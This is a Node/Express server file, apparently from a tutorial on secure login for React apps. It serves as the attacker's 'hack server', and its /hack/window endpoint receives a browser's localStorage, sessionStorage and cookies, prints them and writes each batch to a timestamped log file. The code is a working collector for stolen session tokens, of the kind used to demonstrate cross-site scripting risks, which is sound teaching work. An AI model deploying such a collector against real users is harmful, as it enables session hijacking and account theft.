import bodyParser from 'body-parser';
import cors from 'cors';
import dotenv from 'dotenv';
import express from 'express';
import path from 'path';
import fs from 'fs';
import {fileURLToPath} from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config({path: path.resolve(__dirname, path.join('..', '.env.local'))});

const PORT = process.env.PORT || 5000;

const app = express();

const CORS_CONFIG = {
  credentials: false,
  origin: process.env.CLIENT_BASE_URLS.split(','),
};

app.use(bodyParser.json({extended: true, limit: '30mb'}));
app.use(bodyParser.urlencoded({extended: true, limit: '30mb'}));
app.use(cors(CORS_CONFIG));

app.get('/', (_, res) => {
  res.send(`⚡️ Mastering Secure Login Mechanisms for React Apps - Hack Server!`);
});

// write a path to that gets the window object from a post request as a string and print the different storage objects
app.post('/hack/window', (req, res) => {
  const {localStorage, sessionStorage, cookieStorage} = req.body;

  const formattedData = `
-------------------------------------------------------------------
Received window object from client at - ${new Date().toISOString()}
-------------------------------------------------------------------

Session Storage:
${JSON.parse(JSON.stringify(sessionStorage, null, 4))}

Local Storage:
${JSON.parse(JSON.stringify(localStorage, null, 4))}

Cookie Storage:
${cookieStorage.split('; ').join('\n')}

-------------------------------------------------------------------
`;
  console.log(formattedData);

  const dbPath = path.resolve(__dirname, 'db');
  if (!fs.existsSync(dbPath)) {
    fs.mkdirSync(dbPath);
  }

  // write a file in to the db folder with a timestamp
  // can we format this better? May be write as a text file with a table?
  fs.writeFileSync(path.resolve(__dirname, 'db', `${new Date().toISOString()}.log`), formattedData);

  res.send({localStorage, sessionStorage, cookieStorage});
});

app.listen(PORT, () => console.log(`Server running on port: ${PORT}`));

export default app;
